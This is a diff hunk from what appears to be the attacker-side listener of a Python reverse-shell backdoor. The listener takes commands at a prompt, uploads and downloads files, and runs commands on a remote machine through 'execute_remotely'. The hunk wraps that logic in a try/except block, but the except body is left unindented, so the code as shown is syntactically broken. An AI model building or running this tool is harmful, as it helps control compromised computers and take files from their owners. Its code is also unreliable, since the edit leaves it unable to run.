@@ -49,20 +49,20 @@ class Listener:
             mycommand = input(">> ")
             command = mycommand.split(" ")
             # print (command)
-            # try:
-            if command[0] == "upload":
-                file_content = self.read_file(command[1])
-                command.append(file_content.decode())
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content.decode())
 
-            elif command[0] == "cd" and len(command) > 2:
-                command[1] = " ".join(command[1:])
+                elif command[0] == "cd" and len(command) > 2:
+                    command[1] = " ".join(command[1:])
 
-            result = self.execute_remotely(command)
+                result = self.execute_remotely(command)
 
-            if command[0] == "download" and "[-] Error " not in result:
-                result = self.write_file(command[1], result)
-            # except Exception:
-            #     result = "[-] Error during command execution"
+                if command[0] == "download" and "[-] Error " not in result:
+                    result = self.write_file(command[1], result)
+            except Exception:
+            result = "[-] Error during command execution"
             print(result)
 
 
